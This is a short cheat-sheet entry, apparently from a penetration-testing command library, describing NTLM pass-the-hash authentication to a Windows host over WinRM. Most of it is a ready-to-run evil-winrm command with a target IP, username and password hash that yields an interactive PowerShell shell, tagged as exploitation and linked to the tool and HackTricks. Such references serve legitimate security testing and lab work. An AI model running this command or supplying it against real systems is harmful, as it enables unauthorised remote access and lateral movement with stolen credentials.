---
description: Authenticate to a remote Windows host over WinRM using NTLM Pass-the-Hash and obtain an interactive PowerShell session.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  evil-winrm -i 10.10.10.1 -u john -H 00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396

items:
  - Hash
  - Shell
  - PowerShell

services:
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation

references:
  - https://github.com/Hackplayers/evil-winrm
  - https://book.hacktricks.xyz/windows-hardening/evil-winrm
  - https://docs.microsoft.com/en-us/windows/win32/winrm/portal
---
